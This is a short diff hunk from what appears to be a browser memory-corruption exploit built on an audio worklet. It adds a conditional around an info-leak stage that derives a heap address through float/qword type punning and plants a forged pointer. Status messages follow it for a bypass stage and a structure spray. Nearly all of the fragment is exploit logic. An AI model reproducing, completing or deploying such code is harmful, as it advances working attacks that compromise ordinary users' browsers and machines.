@@ -612,7 +612,7 @@ b.process = (inputs, outputs, parameters)=>{
 };*/
     fuck.port.postMessage("starting");
     
-    
+        if(stage== "leak") {
         var expected_ptr = (BigInt(floatAsQword(c[4])) & 0xFFFFFFFFFFF00000n) - 0x100000n;
         expected_ptr = Number(expected_ptr);
         c[8] = qwordAsFloat(expected_ptr + 0x4010);
@@ -620,6 +620,7 @@ b.process = (inputs, outputs, parameters)=>{
         stage  = "bypass_etc";
         fuck.port.postMessage(c);
         //sleep(4000);
+        }
         
     
         fuck.port.postMessage("spraying structures *unstable*");
